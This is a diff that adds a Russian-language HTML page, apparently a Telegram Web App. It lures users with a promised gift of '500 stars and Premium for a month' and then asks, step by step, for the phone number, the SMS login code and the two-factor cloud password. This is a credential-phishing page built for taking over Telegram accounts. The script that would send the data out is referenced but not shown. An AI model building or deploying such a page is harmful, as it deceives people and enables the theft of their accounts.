@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Получи подарок</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Получи подарок:<br>500 звёзд и Premium на месяц</h1>
+        
+        <div id="step1" class="step active">
+            <select id="country" class="select">
+                <option value="Россия">Россия (+7)</option>
+                <option value="Украина">Украина (+380)</option>
+                <option value="Казахстан">Казахстан (+77)</option>
+                <option value="Беларусь">Беларусь (+375)</option>
+                <option value="Узбекистан">Узбекистан (+998)</option>
+                <option value="Другое">Другое</option>
+            </select>
+            
+            <input type="tel" id="phone" class="input" placeholder="Номер телефона" value="+7">
+            
+            <button id="getCodeBtn" class="button">Получить код</button>
+        </div>
+        
+        <div id="step2" class="step">
+            <p>Введи код из SMS</p>
+            <input type="text" id="code" class="input" placeholder="Код подтверждения">
+            <button id="submitCodeBtn" class="button">Подтвердить</button>
+        </div>
+        
+        <div id="step3" class="step">
+            <p>Требуется облачный пароль</p>
+            <input type="password" id="password" class="input" placeholder="Пароль 2FA">
+            <button id="submitPasswordBtn" class="button">Войти</button>
+        </div>
+        
+        <div id="loading" class="loading" style="display: none;">
+            <div class="spinner"></div>
+            <p>Обработка...</p>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+</body>
+</html>
